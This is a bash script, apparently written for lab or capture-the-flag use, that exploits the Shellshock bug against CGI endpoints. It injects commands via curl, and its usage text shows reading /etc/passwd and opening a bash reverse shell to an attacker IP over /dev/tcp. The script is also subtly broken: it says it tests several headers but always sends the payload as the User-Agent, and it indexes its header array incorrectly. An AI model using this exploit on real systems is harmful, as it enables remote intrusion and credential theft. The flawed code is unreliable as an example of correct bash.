#!/bin/bash
#Written by Elevennails 30/11/2019 Version 1.0
#Use to test http headers for shellshock and inject\run remote code


#declare arry of headers
headings=("Content-Type: text/plain" "Referer: text/plain" "cookie: text/plain")

url=$1

if [ -z "$1" ]; then
	echo " command is optional default is /bin/id, Full paths to commands are required"
	echo " Headings to test, use -h and select number from list" 
	echo "		1 = Content-Type"
	echo "		2 = Referer"
	echo "		3 = Cookie"
	echo " Examples below "
	echo ""
	echo "	./http-shellshock.sh -u url [-h number] [-s 'command to run']"
	echo ""
	echo "	./http-shellshock.sh -u http://10.10.10.56/cgi-bin/"
	echo ""
	echo "Full paths to binaries may be required as web service user may not have loaded profile"
	echo "	./http-shellshock.sh -u http://10.10.10.56:80/cgi-bin/user.sh -h 1 -s '/bin/cat /etc/passwd'"
	echo ""
	echo " If the target is vulnerable we might be able to get a reverse shell using the following... "
	echo " Start a reverse nc listener and run the below changing the attackers IP and port"
	echo "  ./http-shellshock.sh -u http://10.10.10.56:80/cgi-bin/user.sh -h 1 -s '/bin/bash -i >& /dev/tcp/10.10.14.22/443 0>&1'"
	exit 1
fi


while getopts u:h:s: option
do
	case "${option}"
	in
		u) url=${OPTARG};;
		h) header=${OPTARG};;
		s) mycommand=${OPTARG};;
	esac
done


if [ -z "$mycommand" ]; then
	mycommand="/bin/uname -a"
fi

if [ -z "$header" ]; then
	for heading in "${headings[@]}"
	do
	echo "Testing $heading"
	shockerstring="() { ignored; }; echo  $heading ; echo ; echo; $mycommand"
	curl -A "$shockerstring"  $url
	echo ""
	done
else
	echo "Testing $headings[$header]"
	shockerstring="() { ignored; }; echo  $headings[$header]; echo ; echo; $mycommand"
	curl -A "$shockerstring"  $url
fi



